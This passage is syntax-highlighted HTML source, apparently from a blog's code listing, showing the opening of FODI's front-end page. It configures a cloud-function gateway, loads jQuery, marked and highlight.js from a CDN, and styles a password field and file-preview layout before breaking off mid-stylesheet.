class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        * SCF_GATEWAY：SCF 云函数网关地址</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        * SITE_NAME：站点名称</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">        */</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">SCF_GATEWAY</span>: <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">SITE_NAME</span>: <span class="string">&quot;FODI&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">IS_CF</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span>.<span class="property">SCF_GATEWAY</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;workers&#x27;</span>) === -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span>.<span class="property">SCF_GATEWAY</span> += <span class="string">&#x27;/fodi/&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">GLOBAL_CONFIG</span>.<span class="property">IS_CF</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// if (location.protocol === &#x27;http:&#x27;) &#123;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//     location.href = location.href.replace(/http/, &#x27;https&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no&quot;</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/ionicons/4.5.6/ionicons.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/marked/0.6.2/marked.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/highlight.js/9.15.6/highlight.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/highlight.js/9.15.6/styles/github.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/github-markdown-css/3.0.1/github-markdown.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/jquery/3.4.0/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;//s0.pstatp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.password-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.password</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-top</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.password</span> <span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">outline</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: solid <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>) <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.password</span> <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">outline</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: solid <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>) <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.password</span> <span class="selector-tag">button</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        pre * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Courier New;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.preview</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: .<span class="number">8em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">clear</span>: both;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.file-name</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">1em</span> <span class="number">1em</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: solid <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>) <span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">1em</span> .<span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">4em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            user-select: none;</span></span><br><span class="line"><span class="language-css">            -moz-user-select: none;</span></span><br><span class="line"><span class="language-css">            -o-user-select: none;</span></span><br><span class="line"><span class="language-css">            -khtml-user-select: none;</span></span><br><span class="line"><span class="language-css">            -webkit-user-select: none;</span></span><br><span class="line"><span class="language-css">            -ms-user-select: none;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.btn</span><span class="selector-class">.download</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-right</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#arrow-back</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#arrow-forward</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.loading-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: .<span class="number">5em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.loading</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">rgb</span>(<span class="number">218</span>, <span class="number">215</span>, <span class="number">215</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">8em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        ion-<span class="attribute">icon</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">1.5em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: serif;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.markdown-body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">min-width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: .<span class="number">7em</span> <span class="number">1em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: .<span class="number">8em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.markdown-body</span> <span class="selector-tag">h1</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h3</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h4</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h5</span>,</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h6</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.markdown-body</span> <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">90%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-height</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span 